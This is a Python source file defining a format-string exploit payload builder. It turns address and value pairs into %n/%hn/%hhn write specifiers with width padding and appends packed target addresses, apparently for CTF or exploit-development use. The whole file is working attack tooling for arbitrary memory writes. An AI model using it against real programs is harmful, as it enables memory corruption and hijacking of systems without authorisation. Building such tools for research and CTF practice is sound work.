from pwnlib import u8, u16, u32, p32, p64


def fmtstr(idx: int, write: list[tuple[int, bytes]], *,
           n: bool = False,
           hn: bool = True,
           hhn: bool = True,
           iv: int = 0,
           be: bool = False,
           bit32: bool = False) -> bytes:

    def normalize(write: list[tuple[int, bytes]]) -> list[tuple[int, bytes]]:
        write = sorted(write, key=lambda e: e[0])

        result = []
        for (addr1, value1) in write:
            if not result:
                result.append((addr1, value1))

            else:
                addr0, value0 = result[-1]

                if addr0+len(value0) == addr1:
                    result[-1] = (addr0, value0+value1)
                else:
                    result.append((addr1, value1))

        return result

    def split(write: list[tuple[int, bytes]]) -> list[tuple[int, int, str]]:
        if iv < 0x100:
            overwrap = 0x100
        elif iv < 0x10000:
            overwrap = 0x10000
        else:
            overwrap = 0x100000000

        result = []
        for (addr, value) in write:
            while value:
                addr_ = addr

                if n and not addr & 3 and len(value) >= 4:
                    addr += 4
                    i, value = value[:4], value[4:]
                    i = u32(i, be=be)
                    spec = '%{}$n'

                elif hn and not addr & 1 and len(value) >= 2:
                    addr += 2
                    i, value = value[:2], value[2:]
                    i = u16(i, be=be)
                    spec = '%{}$hn'

                elif hhn:
                    addr += 1
                    i, value = value[:1], value[1:]
                    i = u8(i)
                    spec = '%{}$hhn'

                else:
                    raise ValueError

                if i < iv:
                    i += overwrap

                result.append((addr_, i, spec))

        return result

    def concat(write: list[tuple[int, int, str]]) -> bytes:
        size = 8 if not bit32 else 4

        def align(n: int) -> int:
            mask = size-1
            return (n+mask) & ~mask

        write = sorted(write, key=lambda e: e[1])

        fmt = ''
        hooter = b''
        prev = iv
        for (addr, i, spec) in write:
            prev, delta = i, i-prev

            match delta:
                case 0:
                    fmt += spec
                case 1:
                    fmt += f'%c{spec}'
                case _:
                    fmt += f'%{delta}c{spec}'

            if not bit32:
                hooter += p64(addr, be=be)
            else:
                hooter += p32(addr, be=be)

        i = idx
        while True:
            payload = fmt.format(*list(range(i, i+len(write))))
            payload = payload.ljust(align(len(payload)), 'X')

            if i == idx+len(payload)//size:
                break

            i += 1

        payload = payload.encode()
        payload += hooter
        return payload

    return concat(split(normalize(write)))
